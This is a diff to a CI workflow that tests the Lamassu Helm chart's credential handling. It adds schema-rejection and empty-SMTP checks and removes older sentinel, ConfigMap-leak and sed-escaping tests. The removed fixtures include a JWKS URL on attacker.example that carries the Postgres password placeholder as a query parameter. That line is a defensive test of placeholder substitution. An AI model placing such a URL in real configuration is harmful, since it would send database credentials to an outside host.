@@ -77,23 +77,26 @@ jobs:
         run: |
           set -euo pipefail
 
+          helm template lamassu charts/lamassu \
+            --namespace lamassu-test \
+            >/tmp/lamassu-default-rendered.yaml
+          for smtp_variable in LAMASSU_SMTP_USERNAME LAMASSU_SMTP_PASSWORD; do
+            if ! grep -A1 -F "name: $smtp_variable" /tmp/lamassu-default-rendered.yaml |
+              grep -Fq 'value: ""'; then
+              echo "Unauthenticated SMTP must render an empty string for $smtp_variable"
+              exit 1
+            fi
+          done
+
           cat >/tmp/lamassu-secret-values.yaml <<'EOF'
           postgres:
             existingSecret: lamassu-postgres
-            username: POSTGRES_SENTINEL_USERNAME
-            password: POSTGRES_SENTINEL_PASSWORD
           amqp:
             existingSecret: lamassu-amqp
-            username: AMQP_SENTINEL_USERNAME
-            password: AMQP_SENTINEL_PASSWORD
           services:
             alerts:
               smtp_server:
                 existingSecret: lamassu-smtp
-                username: SMTP_SENTINEL_USERNAME
-                password: SMTP_SENTINEL_PASSWORD
-            authz:
-              jwkUrl: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__
           EOF
 
           helm template lamassu charts/lamassu \
@@ -101,9 +104,6 @@ jobs:
             -f /tmp/lamassu-secret-values.yaml \
             >/tmp/lamassu-secret-rendered.yaml
 
-          # Every application config must be rendered through the Secret-aware
-          # init container rather than mounting credentials from a ConfigMap.
-          test "$(grep -c 'name: render-config' /tmp/lamassu-secret-rendered.yaml)" -ge 7
           grep -q 'name: "lamassu-postgres"' /tmp/lamassu-secret-rendered.yaml
           grep -q 'name: "lamassu-amqp"' /tmp/lamassu-secret-rendered.yaml
           grep -q 'name: "lamassu-smtp"' /tmp/lamassu-secret-rendered.yaml
@@ -111,21 +111,14 @@ jobs:
           grep -q '__LAMASSU_AMQP_PASSWORD__' /tmp/lamassu-secret-rendered.yaml
           grep -q '__LAMASSU_SMTP_PASSWORD__' /tmp/lamassu-secret-rendered.yaml
 
-          # Existing Secret references must win over the backwards-compatible
-          # plaintext values and those sentinel values must never be rendered.
-          if grep -q 'SENTINEL' /tmp/lamassu-secret-rendered.yaml; then
-            echo "A plaintext credential fallback was rendered despite existingSecret"
-            exit 1
-          fi
-
-          # Keep coverage for the backwards-compatible fallback path. These
-          # values must reach only the render-config Pod environment and never
-          # be copied into a ConfigMap.
-          cat >/tmp/lamassu-fallback-values.yaml <<'EOF'
+          # Legacy inline credentials must be rejected by the values schema.
+          cat >/tmp/lamassu-inline-credentials.yaml <<'EOF'
           postgres:
+            hostname: postgresql
             username: fallback-postgres-user
             password: fallback-postgres-password
           amqp:
+            hostname: rabbitmq
             username: fallback-amqp-user
             password: fallback-amqp-password
           services:
@@ -134,163 +127,14 @@ jobs:
                 username: fallback-smtp-user
                 password: fallback-smtp-password
           EOF
-          helm template lamassu charts/lamassu \
+          if helm template lamassu charts/lamassu \
             --namespace lamassu-test \
-            -f /tmp/lamassu-fallback-values.yaml \
-            >/tmp/lamassu-fallback-rendered.yaml
-          for fallback in \
-            fallback-postgres-user \
-            fallback-postgres-password \
-            fallback-amqp-user \
-            fallback-amqp-password \
-            fallback-smtp-user \
-            fallback-smtp-password; do
-            grep -Fq "value: \"$fallback\"" /tmp/lamassu-fallback-rendered.yaml
-          done
-          configmaps=$(awk '
-            /^kind: ConfigMap$/ { in_configmap=1 }
-            in_configmap { print }
-            in_configmap && /^---$/ { in_configmap=0 }
-          ' /tmp/lamassu-fallback-rendered.yaml)
-          for fallback in \
-            fallback-postgres-user \
-            fallback-postgres-password \
-            fallback-amqp-user \
-            fallback-amqp-password \
-            fallback-smtp-user \
-            fallback-smtp-password; do
-            if grep -Fq "$fallback" <<<"$configmaps"; then
-              echo "A plaintext fallback was rendered into a ConfigMap: $fallback"
-              exit 1
-            fi
-          done
-
-          # Exercise the same YAML/sed escaping contract used by
-          # lamassu.configSecretInitItem. Single-quoted YAML scalars preserve
-          # double quotes and backslashes; embedded single quotes are doubled.
-          special='a"b\c|d&e'\''f'
-          escaped=$(printf '%s' "$special" |
-            sed -e 's/\\/\\\\/g' -e "s/'/''/g" -e 's/[&|]/\\&/g')
-          rendered=$(printf "password: '__SECRET__'\n" |
-            sed "s|__SECRET__|$escaped|g")
-          test "$rendered" = "password: 'a\"b\\c|d&e''f'"
-          double_quoted_special='a"b|c&d'
-          double_quoted_escaped=$(printf '%s' "$double_quoted_special" |
-            sed -e 's/\\"/__LAMASSU_ESCAPED_QUOTE__/g' -e 's/\\/\\\\/g' -e 's/"/\\\\"/g' -e 's/__LAMASSU_ESCAPED_QUOTE__/\\\\"/g' -e 's/[&|]/\\&/g')
-          double_quoted_rendered=$(printf "password: __SECRET__\n" |
-            sed "s|__SECRET__|\"$double_quoted_escaped\"|g")
-          test "$double_quoted_rendered" = "password: \"a\\\"b|c&d\""
-
-          # Verify the rendered init script uses anchored credential-line
-          # substitutions. This checks the implementation rather than a copy
-          # of its sed expressions in the workflow.
-          grep -Fq \
-            "-e \"s|^\\([[:space:]]*username: \\)'__LAMASSU_POSTGRES_USERNAME__'\\$|\\1'\$pg_user'|g\"" \
-            /tmp/lamassu-secret-rendered.yaml
-          grep -Fq \
-            "-e \"s|^\\([[:space:]]*password: \\)'__LAMASSU_POSTGRES_PASSWORD__'\\$|\\1'\$pg_password'|g\"" \
-            /tmp/lamassu-secret-rendered.yaml
-          grep -Fq \
-            'jwks_url: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__' \
-            /tmp/lamassu-secret-rendered.yaml
-          grep -Fq "Unresolved Lamassu credential placeholder remains after Secret rendering" \
-            /tmp/lamassu-secret-rendered.yaml
-
-          newline=$(printf '\n_')
-          newline=${newline%_}
-          carriage_return=$(printf '\r_')
-          carriage_return=${carriage_return%_}
-          multiline_secret="line-one${newline}line-two"
-          if case "$multiline_secret" in
-            *"$newline"*|*"$carriage_return"*) true ;;
-            *) false ;;
-          esac
-          then
-            :
-          else
-            echo "Multiline Secret values were not rejected"
+            -f /tmp/lamassu-inline-credentials.yaml \
+            >/tmp/lamassu-inline-credentials-rendered.yaml 2>/tmp/lamassu-inline-credentials-error.txt; then
+            echo "The chart accepted legacy inline credentials"
             exit 1
           fi
-          token_secret='prefix__LAMASSU_AMQP_USERNAME__suffix'
-          if case "$token_secret" in
-            *'__LAMASSU_'*) true ;;
-            *) false ;;
-          esac
-          then
-            :
-          else
-            echo "Secret placeholder tokens were not rejected"
-            exit 1
-          fi
-
-          docker run --rm \
-            docker.io/library/busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662 \
-            sh -c "$(cat <<'EOF'
-          set -eu
-          special='a"b\c|d&e'\''f'
-          escaped=$(printf '%s' "$special" |
-            sed -e 's/\\/\\\\/g' -e "s/'/''/g" -e 's/[&|]/\\&/g')
-          rendered=$(printf "password: '__SECRET__'\n" |
-            sed "s|__SECRET__|$escaped|g")
-          test "$rendered" = "password: 'a\"b\\c|d&e''f'"
-          double_quoted_special='a"b|c&d'
-          double_quoted_escaped=$(printf '%s' "$double_quoted_special" |
-            sed -e 's/\\"/__LAMASSU_ESCAPED_QUOTE__/g' -e 's/\\/\\\\/g' -e 's/"/\\\\"/g' -e 's/__LAMASSU_ESCAPED_QUOTE__/\\\\"/g' -e 's/[&|]/\\&/g')
-          double_quoted_rendered=$(printf "password: __SECRET__\n" |
-            sed "s|__SECRET__|\"$double_quoted_escaped\"|g")
-          test "$double_quoted_rendered" = "password: \"a\\\"b|c&d\""
-
-          cat >/tmp/config-template.yaml <<'CONFIG'
-          jwks_url: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__
-          database:
-            username: '__LAMASSU_POSTGRES_USERNAME__'
-            password: '__LAMASSU_POSTGRES_PASSWORD__'
-          CONFIG
-          anchored_rendered=$(sed \
-            -e "s|^\([[:space:]]*username: \)'__LAMASSU_POSTGRES_USERNAME__'\$|\1'admin'|g" \
-            -e "s|^\([[:space:]]*password: \)'__LAMASSU_POSTGRES_PASSWORD__'\$|\1'secret-value'|g" \
-            /tmp/config-template.yaml)
-          printf '%s\n' "$anchored_rendered" |
-            grep -q 'jwks_url: https://attacker.example/jwks?pw=__LAMASSU_POSTGRES_PASSWORD__'
-          printf '%s\n' "$anchored_rendered" |
-            grep -q "password: 'secret-value'"
-          newline=$(printf '\n_'); newline=${newline%_}
-          carriage_return=$(printf '\r_'); carriage_return=${carriage_return%_}
-          reject_control_characters() {
-            if printf '%s' "$1" | LC_ALL=C grep -q '[[:cntrl:]]'; then
-              return 1
-            fi
-          }
-          validate_secret() {
-            reject_control_characters "$1" || return 1
-            if [ -z "$1" ]; then
-              return 1
-            fi
-            case "$1" in
-              *"$newline"*|*"$carriage_return"*|[[:space:]]*|*[[:space:]]|*'__LAMASSU_'*)
-                return 1
-                ;;
-            esac
-          }
-          if validate_secret ' admin'; then
-            exit 1
-          fi
-          if validate_secret 'admin '; then
-            exit 1
-          fi
-          if validate_secret "form$(printf '\f')feed"; then
-            exit 1
-          fi
-          case "line-one${newline}line-two" in
-            *"$newline"*|*"$carriage_return"*) ;;
-            *) exit 1 ;;
-          esac
-          case 'prefix__LAMASSU_AMQP_USERNAME__suffix' in
-            *'__LAMASSU_'*) ;;
-            *) exit 1 ;;
-          esac
-          EOF
-          )"
+          grep -Eq 'username|password' /tmp/lamassu-inline-credentials-error.txt
 
           migration_job=$(awk '
             /^kind: Job$/ { in_job=1 }
